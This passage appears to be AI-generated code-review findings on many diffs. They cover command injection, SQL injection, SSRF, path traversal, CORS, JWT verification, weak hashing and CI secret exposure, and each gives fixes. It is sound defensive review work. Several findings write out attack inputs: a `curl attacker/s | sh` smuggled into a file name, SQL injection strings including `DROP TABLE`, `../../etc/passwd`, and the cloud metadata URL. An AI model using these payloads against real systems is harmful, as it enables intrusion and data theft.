The cost is real: extra build time and an exclusive lock on `invoices` at deploy (plain `CREATE INDEX` without `CONCURRENTLY` blocks writes), permanently doubled write amplification on every insert/update of `invoices`, and duplicated storage. Drop this statement; the existing index already serves tenant-scoped, created_at-ordered lookups. If the intent was to change something about the index (e.g. add an INCLUDE column or a partial predicate), make that difference explicit and drop the old one in the same migration.

findings.title: Eviction clears whole cache, discarding the entry just written
findings.body: When the cache crosses 1000 entries, `_CACHE.clear()` runs *after* the new tenant was inserted, so the value this call just populated is thrown away along with every other tenant. A caller that does `get_tenant_fresh(x)` and then relies on `get_tenant(x)` hitting the cache will get `None` on exactly the calls that crossed the threshold, and every warm tenant is forced to re-`_fetch` at once. Evict a bounded number of entries instead (e.g. use `collections.OrderedDict`/`functools.lru_cache` semantics, or pop the oldest key) and do the size check before inserting so the fresh entry survives.

findings.title: `get_*` function name misleads about mutation
findings.body: The function `get_tenant_fresh()` uses the `get_` prefix, which conventionally signals a read-only lookup operation. However, the implementation mutates the cache on lines 10-12 by writing to `_CACHE[tenant_id]`, clearing it when it exceeds size 1000, and returning the fetched value. This violates the naming convention established by the existing `get_tenant()` function on line 4, which genuinely reads without side effects. Consider renaming to `fetch_and_cache_tenant()` or similar to signal that mutation occurs.

findings.title: Flush-all eviction lets arbitrary keys amplify backend load
findings.body:
`get_tenant_fresh` inserts every requested `tenant_id` into `_CACHE` and, once the map exceeds 1000 entries, discards the *entire* cache rather than evicting a single entry. If this function is reachable (directly or indirectly) with caller-supplied tenant identifiers, a caller can enumerate 1001 arbitrary IDs to wipe all warm entries, so every legitimate lookup afterwards falls through to `_fetch`. Repeating that gives a cheap amplification against whatever `_fetch` talks to.

Prefer a bounded eviction policy that drops one entry (e.g. `functools.lru_cache` or an explicit LRU/`OrderedDict.popitem(last=False)`), and consider only caching IDs that `_fetch` resolved to a real tenant so unknown IDs cannot occupy cache slots at all.

findings.title: No test coverage for get_tenant_fresh's cache mutation/eviction logic
findings.body: get_tenant_fresh fetches a value, writes it into _CACHE, and clears the entire cache once size exceeds 1000. None of this is exercised by any test in the diff, so a bug (e.g. clearing too eagerly, wrong threshold, or failing to overwrite stale cache entries) would go undetected. Since there is no existing test file for cache/lookup.py in this diff, this is a genuine coverage gap for a function with observable side effects, not just an untested getter.

findings.title: README documents renamed CLI flag by old name
findings.body: The README at line 7 documents `--workers` as a CLI flag, but the code in cli.py line 6 has renamed this flag to `--concurrency`. Users following the README will use an incorrect flag name that no longer exists. Update the README to document the new flag name.

findings.title: Flag rename also renames the Namespace attribute args.workers
findings.body: `p.add_argument("--workers", ...)` produced `args.workers`; `--concurrency` produces `args.concurrency`. Any consumer of this parser that still reads `args.workers` will raise `AttributeError` at runtime, and any external script or CI invocation passing `--workers` will now fail with an argparse error rather than being silently accepted. If the old name must keep working, add `p.add_argument("--workers", dest="concurrency", type=int, help=argparse.SUPPRESS)` as a deprecated alias; otherwise grep for `args.workers` / `"--workers"` across the repo and call sites and update them in this same change.

findings.title: Docstring describes old return type; function now returns dict
findings.body: The docstring states the function returns "the total number of API calls this month as an integer", but the implementation now returns a dictionary mapping days to call counts. A caller reading the docstring would expect `int` and attempt operations like addition or comparison, which would fail on a `dict`. Update the docstring to accurately describe the new return type and structure.

findings.title: Return shape changed from int to dict without renaming or updating callers
findings.body:
`monthly_usage` previously returned a single integer (`_db.scalar(...)`) and now returns `{day: count}`. Any existing caller that treats the result as a number — summing it, comparing it to a quota threshold, formatting it into a string, or serialising it as a scalar in an API response — will now silently get a dict and either raise a `TypeError` or emit a wrong value (e.g. `if monthly_usage(a) > limit` raises, while `if monthly_usage(a):` becomes truthy for any non-empty day set instead of reflecting a real total). The docstring on line 2 still states "Return the total number of API calls this month as an integer", which means callers reading the contract are being told the old behaviour.

Either keep `monthly_usage` returning the total and add a separate `daily_usage` for the breakdown, or rename this function and update every call site plus the docstring. No call sites were retrieved here, so please confirm them before merging.

findings.title: No test covers new dict-shaped return value of monthly_usage
findings.body: monthly_usage's return type and semantics changed from a single integer total to a dict mapping day -> count, but no test file is part of this diff. If _db.fetch or the dict comprehension were broken (e.g. wrong key names, wrong grouping, off-by-one in aggregation), nothing would fail. Add a test asserting the returned mapping's structure and values against a known set of rows.

findings.title: Renaming page_size to limit breaks keyword-argument callers
findings.body:
`list_invoices` previously accepted `page_size`; it now accepts `limit`. Any existing call of the form `list_invoices(tenant_id, page_size=100)` will now raise `TypeError: list_invoices() got an unexpected keyword argument 'page_size'`, and the failure is at call time rather than at import, so it will not be caught by a syntax or type check unless callers are annotated. Positional callers are unaffected.

Either update every call site in the same change, or keep backwards compatibility for a deprecation window, e.g. accept `page_size=None` and map it onto `limit` with a `DeprecationWarning`. No call sites were available in the retrieved context, so this needs a repository-wide grep for `page_size=` to confirm the blast radius.

findings.title: Docstring references renamed parameter
findings.body: The docstring on line 6 documents `page_size`, but the function parameter was renamed to `limit` on line 1. Update the docstring to match the new parameter name so callers can correctly understand the function signature.

findings.title: Command injection: shell=True with interpolated name/directory
findings.body:
`create_archive` formats `name` and `directory` directly into a shell command string (line 9) and executes it with `shell=True` (line 10). Any shell metacharacter in either argument escapes the intended `tar` invocation — e.g. `name = "x; curl attacker/s | sh; #"` or `directory = "/tmp $(id)"` — yielding arbitrary command execution with the privileges of the process.

Fix by dropping the shell and passing an argument list, as `list_exports` on line 5 already does:

```python
def create_archive(name, directory):
    target = os.path.join("/exports", f"{name}.tar.gz")
    return subprocess.run(["tar", "-czf", target, directory], check=True)
```

Additionally validate `name` against a strict allowlist (e.g. `^[A-Za-z0-9._-]+$`) and reject `..`/separators, since even without a shell an interpolated `name` lets a caller write the archive outside `/exports` via path traversal.

_Also raised by the correctness agent:_ Unquoted interpolation into shell command breaks on spaces/metacharacters

findings.title: No test coverage for new create_archive function
findings.body: create_archive builds a shell command via f-string interpolation and executes it with shell=True. There is no test in this diff exercising this function, so a change to its behavior (or the injection vulnerability itself) would go undetected. Since the existing list_exports function also lacks visible test coverage in this diff, this may be consistent with the repo's current testing standard, but the risk profile here (shell command construction from user input) makes the absence more consequential.

findings.title: Return shape differs from the sibling function in this module
findings.body: `list_exports` (line 5) returns `.stdout` bytes, while `create_archive` returns the whole `CompletedProcess`. Because `capture_output` is not set here, that object's `stdout`/`stderr` are `None`, so a caller that follows the module's existing shape and reads `.stdout` gets `None` rather than output. Either return `None`/a path explicitly, or set `capture_output=True` and return `.stdout` for consistency. No existing callers were retrieved, so this is a forward-looking consistency note rather than a confirmed break.

findings.title: dashboardCors allows any origin with credentials enabled
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, in a file whose existing export (line 6) restricts requests to the `ALLOWED` list. Any route that mounts `dashboardCors` therefore has its origin allowlist removed while still being a credentialed (cookie/Authorization-bearing) endpoint.

The entry point is the `Origin` request header on whatever routes mount this middleware; the sink is the `Access-Control-Allow-Origin` response header. Those routes are not in this diff, so the exposed surface cannot be enumerated from here.

Two outcomes, both bad:
- If the middleware emits a literal `*`, browsers reject credentialed responses and the dashboard silently breaks — the usual next step is to "fix" it by reflecting `req.headers.origin`, which produces a fully exploitable cross-origin read of authenticated data.
- If this or any wrapper reflects the request origin (several CORS helpers do when credentials are on), then any attacker-controlled page can already issue credentialed requests and read the responses of the dashboard API for a logged-in victim.

Fix: give the dashboard its own explicit allowlist (e.g. extend `ALLOWED` with the dashboard origin) and keep `credentials: true` only against that list. Never combine a wildcard or reflected origin with credentials.

findings.title: origin "*" with credentials: true is rejected by browsers
findings.body:
`dashboardCors` sets a literal wildcard origin together with `credentials: true`. The `cors` middleware will emit `Access-Control-Allow-Origin: *` alongside `Access-Control-Allow-Credentials: true`, and the Fetch/CORS spec requires user agents to fail any credentialed request whose `Access-Control-Allow-Origin` is `*`. The practical result is that the dashboard's cookie/`Authorization`-bearing cross-origin calls will be blocked by the browser, so this config does not achieve what it is written to achieve — and preflights for it will appear to pass while the real request fails, which is an unpleasant thing to debug.

To actually allow the dashboard, echo a specific permitted origin instead of `*` — e.g. `origin: (o, cb) => cb(null, DASHBOARD_ORIGINS.includes(o))` or reuse the existing `ALLOWED` value from line 6 extended with the dashboard host. That also avoids exporting a middleware that, if it ever were honoured by a non-browser client, would grant credentialed access to every origin.

findings.title: Live AcmePay secret key hardcoded in source
findings.body:
`ACMEPAY_SECRET_KEY` is a literal bearing the `acme_live_` prefix, which conventionally denotes a production (non-sandbox) credential. It replaces the previous `os.environ["ACMEPAY_SECRET_KEY"]` lookup, so the secret now lives in version control and in every build artifact, container image and developer checkout. Anyone with read access to the repository — including CI logs, forks, and anyone who ever clones it — can charge, refund or read payment data against the live account.

Actions: (1) treat this key as compromised and rotate it in the AcmePay dashboard immediately; (2) restore the environment-variable lookup (or a secrets manager read) inside `client()`; (3) purge the value from git history, since reverting the commit leaves it reachable; (4) consider adding a pre-commit secret scanner so the `acme_live_` prefix is caught before push.

findings.title: Env-var configuration removed; all environments now use one baked-in key
findings.body:
`client()` previously resolved the key at call time from `os.environ["ACMEPAY_SECRET_KEY"]`, which let staging/CI/local deployments supply their own (test) key. After this change the key is a module constant, so every environment resolves to the same value — and the literal is prefixed `acme_live_`, i.e. a production key. Any deployment that was relying on setting `ACMEPAY_SECRET_KEY` to a non-production value will now transact against production, silently, with no failure signal. The `os` import was also dropped, so there is no remaining fallback path.

Suggest keeping the environment lookup as the source of truth (optionally with an explicit, loud failure when unset) rather than a compiled-in default.

findings.title: client() behavior change has no test to catch regressions
findings.body: The diff changes client() to read the API key from a hardcoded module-level constant instead of os.environ. No test in this PR (or apparently before it) calls client() and asserts acmepay.api_key is set correctly. The new fixtures/acmepay.py only defines a fake_client() helper and a TEST_KEY constant — it is test infrastructure, not a test. If client() were broken (e.g., wrong constant referenced, or the assignment silently failing), nothing would fail.

findings.title: tenant_of returns an unauthenticated, caller-controlled tenant id
findings.body:
`tenant_of` decodes with `options={"verify_signature": False}`, which in PyJWT also skips `exp`/`nbf`/`aud` validation. The returned `tenant_id` is therefore whatever the requester put in the token payload — no signature, no expiry check. Any caller that uses this value to scope a query or an authorization decision can be made to read or write another tenant's data by sending a self-crafted (or expired) token. Derive the tenant from the verified claims instead, e.g. `return claims_for(token)["tenant_id"]`, which already performs RS256 verification with `public_key()` on line 7. If the motivation was avoiding the key lookup, cache `public_key()` rather than dropping verification.

_Also raised by the security agent:_ tenant_id read from a JWT with signature verification disabled

findings.title: Unguarded dict index raises KeyError for tokens without tenant_id
findings.body: `unverified["tenant_id"]` assumes the claim is always present. Because verification is disabled, no claim-set validation (`require`/`options`) runs either, so a token lacking `tenant_id` — a service token, a legacy token, or an empty payload — propagates a raw `KeyError` out of `tenant_of` rather than an auth error the caller can handle. Use `unverified.get("tenant_id")` and handle the missing case explicitly, or raise a domain-specific exception so callers can return 401/403 instead of a 500.

findings.title: New unverified-claims extraction path has no test coverage
findings.body: tenant_of() introduces a security-relevant behavior change (decoding a JWT without verifying its signature) but no test is added in this diff. Nothing would fail if this function were later changed to trust a forged token differently, throw on missing tenant_id, or if verification were silently re-enabled/disabled. At minimum a test asserting tenant_of() extracts tenant_id from a crafted unsigned/invalid-signature token would catch regressions in this specific behavior.

findings.title: Missing ownership check lets any user edit any payment method
findings.body:
`update_payment_method` takes `pm_id` from the request, loads the object with `PaymentMethod.get(pm_id)` (line 12) and immediately writes `body["billing_name"]` and persists it (lines 13-14) without ever calling `require_owner`. It resolves `user = current_user(request)` on line 11 but never uses it, so the function is authenticated but not authorised — any logged-in caller who can guess or enumerate a `pm_id` can rewrite the billing name on another user's stored card. The retrieved `api/auth.py` states explicitly that "Every object mutation must call this", and the read-only handler directly above (line 6) does. Add `require_owner(user, pm)` immediately after the `get` on line 12 and before any assignment.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unchecked body["billing_name"] raises KeyError on malformed request

_Also raised by the docs agent:_ update_payment_method lacks ownership check

findings.title: No test coverage for update_payment_method authorization
findings.body: update_payment_method loads a PaymentMethod by id and mutates/saves it without calling require_owner (unlike the get handler above it, which does call require_owner on line 6). There is no test file in this diff, so nothing would fail if a user could update another user's payment method by id. Since the sibling read endpoint enforces ownership and presumably has or would have a test for it, an equivalent test for the write path is the missing coverage here.

findings.title: No None guard on PaymentMethod.get before attribute write
findings.body: If `PaymentMethod.get(pm_id)` returns `None` for an unknown id, line 13 raises `AttributeError` and the caller sees a 500 instead of a 404. The read path on line 5 has the same shape, so this may be handled by `get` raising internally \u2014 but if `get` can return `None`, the write path needs an explicit not-found branch before the mutation. Worth confirming the contract of `PaymentMethod.get`.

findings.title: Rate limit removed from password reset endpoint
findings.body:
`request_reset` no longer carries the `@rate_limit("5/hour")` decorator, and the `limits` import was dropped with it, so nothing in this file bounds how often the endpoint can be called. An unauthenticated caller controls `email` and can invoke the handler in a loop, which (a) lets them use your mail infrastructure to flood an arbitrary victim's inbox with reset messages, (b) enables account-enumeration probing at high volume if the response or timing differs for known vs. unknown addresses, and (c) burns reset-token generation and mail-send quota. Password reset is a classic abuse target precisely because it is pre-authentication and sends attacker-addressed mail.

Restore the decorator, or if the limiter is being moved, apply an equivalent limit at the middleware/gateway layer keyed on both source IP and the submitted email address before this lands. If the removal is deliberate because of a limiter migration, please say so in the PR description and point at the replacement.

_Also raised by the docs agent:_ Public password reset endpoint now lacks documented rate limit

findings.title: request_reset now sends reset mail with no call-rate bound
findings.body: `request_reset` unconditionally calls `send_reset_email(email)` on every invocation and returns `{"sent": True}`. With the `@rate_limit("5/hour")` guard removed there is nothing bounding how often this side effect fires for a given caller or a given target address, so a single client can drive unlimited outbound mail to an arbitrary address (mailbox flooding, mail-provider reputation damage, and cheap probing of reset behaviour). If the intent was to move throttling elsewhere — middleware, gateway, or inside `send_reset_email` — that should be stated and verified, because nothing in this file enforces it now. Otherwise restore the decorator or add an equivalent per-IP/per-email bound before the send.

findings.title: No test guards rate limiting on password reset endpoint
findings.body: The @rate_limit("5/hour") decorator was removed from request_reset with no corresponding test change in this diff. If a test previously asserted rate-limiting behavior (e.g. that repeated calls get throttled), it is not shown here as being updated or removed, and if no such test exists at all, this behavior change (allowing unlimited reset requests) would go completely uncaught by the test suite.

findings.title: read_export_preview skips _confined, allowing reads outside EXPORT_ROOT
findings.body:
`read_export_preview` builds its path with `os.path.join(EXPORT_ROOT, name)` and opens it directly, while the sibling reader two lines above passes `name` through `_confined(name)` first. Two reachable inputs escape the export root: a relative `name` such as `../../etc/passwd`, and an absolute `name` such as `/etc/passwd`, which makes `os.path.join` discard `EXPORT_ROOT` entirely. Route `name` through `_confined` here too (`path = _confined(name)`) so both entry points share one containment check, rather than duplicating the join.

_Also raised by the security agent:_ Path traversal: read_export_preview skips _confined() containment

findings.title: Public API `read_export_preview` undocumented and contract unclear
findings.body: The function `read_export_preview` is exported at module level alongside `read_export`, which normalises and confines paths. A caller reading only the function name and signature cannot determine whether `name` is safe to pass user-supplied values into. The adjacent `read_export` function uses `_confined()` to prevent path traversal; this one does not, but that critical difference is invisible to callers. Either document the security implications clearly, or apply the same confinement.

findings.title: No test coverage for read_export_preview path handling
findings.body: read_export_preview builds a path via os.path.join(EXPORT_ROOT, name) without the _confined() normalization/containment used by the sibling function above (lines 14-16). There is no test in this diff exercising this function with a traversal-style name (e.g. '../secret') to verify whether it stays within EXPORT_ROOT or escapes it. Without such a test, a regression or the current unsafe behavior would go undetected.

findings.title: Ownership check removed from bulk_export enables cross-tenant read
findings.body:
`bulk_export` takes `report_ids` from the caller, loads each `Report` by id, and returns `r.to_dict()` with no authorisation step. The loop calling `require_owner(user, report)` was deleted and the import narrowed to `current_user` only, so `current_user(request)` now only establishes *who* the caller is and nothing constrains *which* reports they may read. Any authenticated user can enumerate or guess report ids belonging to other tenants and receive their full serialised contents.

If the goal was performance, keep the control and make it cheap: fetch with a tenant-scoped query (e.g. `Report.filter(id__in=report_ids, tenant_id=user.tenant_id)`) so the check is a predicate in the single query rather than N Python calls, and return a 403/404 when the returned count differs from the requested ids. Do not ship the endpoint with no check at all.

_Also raised by the correctness agent:_ bulk_export no longer enforces tenant ownership on returned reports

findings.title: No test guards against cross-tenant data exposure in bulk_export
findings.body: The removed require_owner check means bulk_export now returns reports regardless of tenant ownership. This diff includes no test asserting that a user cannot export another tenant's report_ids, so a regression like this (or a future one) would not be caught by any existing test suite. Add a test that calls bulk_export with report_ids belonging to a different tenant and asserts a Forbidden error is raised.

findings.title: SQL injection via f-string in search_customers
findings.body:
`search_customers` interpolates `term` and `status` into the SQL string with an f-string and then calls `execute(sql)` with no `params`. Both values are embedded inside single-quoted literals, so a caller value containing `'` terminates the literal and the rest is parsed as SQL — e.g. `status = "x' OR '1'='1"` returns every row, and `term = "%'; DROP TABLE customers; --"` reaches the interpreter as statement text depending on driver multi-statement settings.

Use the same parameterised form as `get_customer` on line 5, keeping the wildcards in the bound value rather than the SQL:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

Note that `execute`'s own docstring states `params` must carry every caller value, so this call also violates that contract. If `status` is drawn from a fixed set, additionally validate it against an allowlist.

findings.title: search_customers inlines values, violating execute()'s params contract
findings.body: `billing.db.execute` documents "`params` must carry every caller value", and `get_customer` on line 5 follows that with `%s` plus a tuple. Line 9 instead builds the whole statement by f-string and line 10 calls `execute(sql)` with `params` omitted, so no caller value ever reaches the driver's escaping. Beyond the injection exposure, this is plainly incorrect for reachable ordinary inputs: `term="O'Brien"` closes the quoted literal and the driver raises a syntax error, and a `None` status renders as the string `'None'` so the query silently matches nothing instead of failing or matching. Rewrite as `execute("SELECT * FROM customers WHERE name LIKE %s AND status = %s", (f"%{term}%", status))` \u2014 note the `%` wildcards must move into the parameter value, because once a non-None `params` is supplied the driver will try to interpret literal `%` in the SQL text as a placeholder.

findings.title: search_customers has no test coverage
findings.body: The new search_customers function builds a SQL string via f-string interpolation of `term` and `status` directly into the query. There is no test in this diff exercising this function, so neither its behavior (e.g. correct filtering) nor a future fix to parameterize the query would be verified by any test. Add a test that calls search_customers with values containing quotes/special characters and asserts on the resulting query/params (or on parameterized execution), so a regression to unsafe string interpolation would be caught.

findings.title: SSRF: verify_endpoint fetches arbitrary caller-supplied URL
findings.body:
`verify_endpoint(url)` passes its argument straight into `requests.get` with no validation. The function immediately above it parses the URL and rejects anything whose host is not in `ALLOWED_HOSTS` (lines 8-10); the new function applies none of that. Any caller-reachable path to `verify_endpoint` lets an attacker make the server issue GET requests to internal addresses — `http://169.254.169.254/latest/meta-data/` for cloud instance credentials, `http://127.0.0.1:<port>/` for admin interfaces bound to loopback — and the returned status code is an oracle for internal port/host scanning. Non-HTTP schemes (`file://` via handlers, `http+unix`, etc.) are also unchecked.

Apply the same control the send path uses before the request: parse the URL, require the scheme to be `http`/`https`, and require the host to be in `ALLOWED_HOSTS`. Also resolve the host and reject private/link-local/loopback ranges, and pass `allow_redirects=False` (by default `requests` follows redirects, so an allowlisted host can 302 the server into the internal network).

_Also raised by the correctness agent:_ verify_endpoint skips the ALLOWED_HOSTS check its sibling enforces

findings.title: New verify_endpoint has no test coverage
findings.body: verify_endpoint is a new public function that performs a network request and returns a status code, but no test in this diff exercises it — neither a happy path nor the missing host-allowlist check that the sibling function above enforces. Since existing code applies ALLOWED_HOSTS validation before calling requests.post, and verify_endpoint skips that check entirely, a test would need to assert that behavior (or its absence) is intentional; without one, nothing fails if this function is later called with attacker-controlled URLs or its behavior changes silently.

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
findings.body:
The evident purpose of `verify_endpoint` is to tell the caller whether a registered target is reachable, but the expected failure modes of that check \u2014 DNS failure, connection refused, TLS error, and the 5s timeout itself \u2014 all surface as `requests.exceptions.RequestException` rather than as a return value. The declared contract (returns an int status code) therefore only holds on the success path; every caller has to wrap the call in a try/except to get the answer it asked for.

Catch `requests.RequestException` and return a sentinel (e.g. `None`) or re-raise a domain-specific error, and document which it is, so callers have one thing to handle.

findings.title: Public function `verify_endpoint` lacks documented contract
findings.body: The function `verify_endpoint` is a module-level export with no docstring, comment, or other documentation explaining its contract. A caller cannot determine from the name and signature alone whether it expects a validated URL, what timeout behaviour is, whether it raises on HTTP errors, or what the return value semantics are (is status_code 200 required? is any 2xx acceptable?). This is particularly concerning given the pattern in the same file of URL validation — callers may assume this function validates URLs before fetching, when it does not.

findings.title: Public access block disabled on customer invoices bucket
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets all four guardrails (`block_public_acls`, `block_public_policy`, `ignore_public_acls`, `restrict_public_buckets`) to `false` on a bucket named `acme-customer-invoices`. The PR description states only the assets bucket is meant to be public. With all four flags off, any principal that can call `PutBucketPolicy` or `PutObjectAcl` — including a mis-scoped CI role, a future Terraform change, or a compromised deploy credential — can make the bucket or individual invoice objects world-readable, and AWS will not block it. Customer invoices are PII/financial data.

Fix: either drop the `aws_s3_bucket_public_access_block.invoices` resource entirely (so the account-level defaults apply) or set all four attributes to `true`. Consider also asserting no public bucket policy exists for this bucket in CI.

_Also raised by the correctness agent:_ Invoices bucket disables all public-access guardrails (copy-paste from assets)

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the expected HMAC identically to `verify_stripe` but returns `expected == header`. Python's `str.__eq__` short-circuits on the first differing byte, so the comparison time leaks how many leading hex characters of the attacker-supplied `header` match the expected digest, allowing a signature to be recovered byte-by-byte by an attacker who can submit repeated webhook deliveries and measure response latency. The sibling function one line above already does the right thing. Change line 12 to `return hmac.compare_digest(expected, header)` to match `verify_stripe`.

Note one behavioural difference to handle while making the change: `==` tolerates a non-string `header` (e.g. `None` from a missing HTTP header) by returning `False`, whereas `compare_digest` raises `TypeError` on mismatched/non-ASCII-str operands. If callers can pass `None`, guard with `if not header: return False` before the comparison so the fix does not turn a clean `False` into a 500.

_Also raised by the security agent:_ Webhook HMAC compared with == instead of compare_digest

findings.title: New verify_acmepay function has no test coverage
findings.body: The new verify_acmepay function (lines 10-12) is added with no accompanying test. If it were changed—e.g., swapping the insecure == for compare_digest or vice versa, or breaking the HMAC computation—nothing in the test suite would catch it. Given there's an equivalent verify_stripe function likely covered by existing tests (not shown in diff), a parallel test for verify_acmepay comparing behavior (correct signature accepted, incorrect rejected) would catch both correctness and timing-safety regressions.

findings.title: Exception message and traceback returned in HTTP 500 response
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` body; it now returns `str(exc)` plus `traceback.format_exc()`. Any client able to provoke an unhandled exception (malformed input, bad IDs, resource exhaustion) receives filesystem paths, module and function names, source line fragments, library versions, and frequently fragments of data embedded in exception messages (DB errors commonly echo SQL and column names; connection errors can echo hosts and, in some drivers, credentials). That is free reconnaissance for an attacker mapping the application before a targeted attack.

Keep the client-facing body opaque and keep the detail server-side, where `log.exception("request failed")` on line 8 already captures it. If callers need to correlate, generate a random incident id, log it alongside the exception, and return only that id. If verbose output is genuinely wanted for local development, gate it behind an explicit debug flag that is off by default rather than making it the unconditional response.

_Also raised by the correctness agent:_ Exception message and traceback returned to the client

_Also raised by the correctness agent:_ format_exc() ignores the `exc` argument and may report the wrong traceback

_Also raised by the correctness agent:_ Error response body shape changed for existing callers

findings.title: No test guards against leaking exception details to clients
findings.body: The handle() function now returns str(exc) and a full traceback in the response body, a behavior change with security implications. There is no test file in this diff verifying the shape/content of the error response, so a regression (or the introduction of this leak itself) would go undetected by any automated check.

findings.title: Reset path writes MD5 digests incompatible with bcrypt verification
findings.body:
`hash_password` returns a bcrypt hash (`bcrypt.hashpw(...).decode()`), and the accompanying verification is therefore almost certainly `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-hex-char MD5 digest for the same conceptual value (a stored password). Two concrete consequences: (1) if both write to the same column, `bcrypt.checkpw` on an MD5 digest either raises or returns False, so a user who completes a reset can no longer log in; (2) if some code path instead compares the MD5 directly, the stored credential is an unsalted, unstretched digest of the user's password, which is trivially reversible from a dump.

There is no reason the reset path needs a different algorithm from the enrolment path. `hash_reset_password` should delegate to `hash_password` (or be removed and callers pointed at `hash_password`). If the intent was to hash a reset *token* rather than a password, the name and parameter should say so and it still should not be MD5 

I could not see the callers or the storage schema, so the exact failure mode depends on which of the two cases above holds 
 both are serious.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` hashes the raw password with a single, unsalted MD5 round. MD5 is a fast hash with GPU rates in the tens of billions per second and enormous precomputed rainbow tables; unsalted, it also means identical passwords produce identical digests across accounts. Anyone who obtains the reset-password column (SQL injection, backup leak, insider read) recovers plaintext passwords for most users, and because a password set through the reset flow is presumably the user's real login credential, this degrades the whole account store to the weakest hash in use.

Use the same primitive as the existing function: `return bcrypt.hashpw(raw.encode(), bcrypt.gensalt()).decode()`. If the reset flow genuinely needs a different representation, it should still be bcrypt/scrypt/argon2 with a per-value salt, and verification should use `bcrypt.checkpw` rather than digest equality. If this value is really a one-time reset *token* rather than a password, it should be a `secrets.token_urlsafe` value compared with `hmac.compare_digest`, not a hash of user input.

findings.title: Public password hash function lacks security documentation
findings.body: The function `hash_reset_password` is a public API (exported at module level, following the naming convention of `hash_password`) that hashes passwords using MD5, a cryptographically weak algorithm unsuitable for password storage. A caller could reasonably assume it uses the same secure bcrypt approach as `hash_password`, or might not realize MD5 is inadequate for this use case. Without documentation explaining the security properties and intended use, callers are at risk of misusing this for general password hashing. Add a docstring explaining why MD5 is used here (if there is a valid reason) or clarifying the limited scope of this function.

findings.title: No test coverage for new password reset hashing function
findings.body: hash_reset_password is a new public function with no accompanying test. Since it uses MD5 instead of bcrypt (unlike hash_password), any test that did exist would likely just assert the hash format without catching the underlying weak-hash defect. As it stands, nothing in this PR would fail if this function were wrong or insecure.

findings.title: pull_request_target runs fork-controlled code with repo secrets
findings.body:
`pull_request_target` runs in the context of the base repository: the job receives the full repository secret store and a `GITHUB_TOKEN` with write permissions, and it runs without maintainer approval for first-time contributors. Lines 11-12 then check out `github.event.pull_request.head.sha` — code from the fork — and line 13 executes `./scripts/measure.sh` from that checkout, with `secrets.NPM_TOKEN` injected into its environment.

An attacker's path is: open a pull request from a fork whose branch modifies `scripts/measure.sh` (or any file it sources, or a lockfile/`package.json` that causes an install hook to run). The workflow checks that branch out and runs it. The script can print, POST, or otherwise exfiltrate `$NPM_TOKEN`, read every other secret reachable via the runner environment, and use the write-scoped `GITHUB_TOKEN` to push commits or alter releases. No victim interaction and no second request is required — merely opening the PR triggers it.

Recommended fixes, in order of preference:
1. Revert to `pull_request`. If the only goal is measuring a diff's size, the untrusted-code trigger is not needed and the job gets no secrets.
2. If write access to the PR (e.g. commenting a size report) is genuinely required, split it: a `pull_request` job that checks out and runs untrusted code with no secrets and uploads an artifact, plus a separate `workflow_run` job that has the token and only consumes the artifact — never executing fork code.
3. If `pull_request_target` must stay, do not check out the fork head at all; check out the base ref, run only base-repo scripts, and never pass secrets to anything that touches fork content. Additionally set an explicit `permissions:` block (e.g. `contents: read`) to shrink the token.

_Also raised by the correctness agent:_ pull_request_target runs fork-controlled script with NPM_TOKEN

findings.title: Checkout of head.sha changes what the size check measures
findings.body: Under the previous `pull_request` trigger, `actions/checkout` defaults to the merge ref (`refs/pull/N/merge`), so the size was measured against the PR merged into the base. Pinning `ref: github.event.pull_request.head.sha` measures the head commit in isolation, so results will drift whenever the base branch has moved and will no longer reflect the size of the code that would actually land. If the merge-result semantics are what downstream checks/comparisons assume, this is a silent behaviour change; consider checking out the merge commit explicitly or documenting the new semantics.

findings.title: Key now requires a JSON-serialisable context; non-JSON values raise TypeError
findings.body:
The previous key, `(template_source, tuple(sorted(context.items())))`, accepted any context whose values were hashable and whose keys were mutually comparable — `datetime`, `Decimal`, custom objects with `__hash__`, model instances, etc. `json.dumps` accepts a much narrower domain and raises `TypeError: Object of type X is not JSON serializable` for anything outside dict/list/str/int/float/bool/None. Any existing caller passing a rich context object now fails at the cache layer before `_render` is ever reached, turning a working render into an exception.

If contexts are not guaranteed to be plain JSON data, either pass `default=repr` (or a project-specific encoder) to `json.dumps`, or fall back to the old tuple key when serialisation fails.

findings.title: `directory` is no longer shell-split, breaking multi-path or quoted callers
findings.body: Under `shell=True` the interpolated `{directory}` was word-split by the shell, so a caller passing `"/srv/a /srv/b"` archived two directories, and a caller passing a pre-quoted value such as `"'/srv/my data'"` archived one directory with a space. With the list argv, `directory` is a single literal argument: the multi-path caller now gets `tar: /srv/a /srv/b: Cannot stat` and a non-zero exit, which `check=True` turns into `CalledProcessError`. The pre-quoted caller now looks for a directory whose name literally contains quote characters. Grep the callers of `create_archive` for any value that is not a single bare path; if multiple sources must be supported, change the parameter to accept a sequence and splat it into the argv (`["tar", "-czf", dest, "--", *directories]`).

findings.title: Test only checks shell=False kwarg, not the safety of the argv list
findings.body: test_runs_without_a_shell asserts spy.last_call.kwargs["shell"] is False but never inspects spy.last_call.args (the actual command list). The security fix here is that name/directory are passed as separate argv elements rather than being interpolated into a shell string. A regression that keeps shell=False but reintroduces string interpolation (e.g. ['sh', '-c', f'tar -czf ... {name} ...']) or drops the '--' separator would still pass this test, since only the shell kwarg is checked. Add an assertion on the actual command list passed to subprocess.run to verify name and directory appear as discrete, unmodified argv elements.

findings.title: `directory` reaches tar unvalidated (arbitrary path archived)
findings.body: `name` is now tightly constrained, but `directory` is passed straight through to `tar` as the source path with no validation. Because the argv is a list and `--` precedes it, this is not command or option injection — the worst case is that a caller who controls `directory` can cause an arbitrary readable directory (e.g. `/etc` or `/root`) to be packaged into `/exports/<name>.tar.gz`, where whoever can fetch exports can read it. Whether that matters depends on who supplies `directory`, which is not visible here. If callers can be end users, constrain `directory` to a configured export root (e.g. resolve it and assert it is under a base path) before invoking tar.

findings.title: Allowlist rejects names that previously worked (dots, spaces, >64 chars)
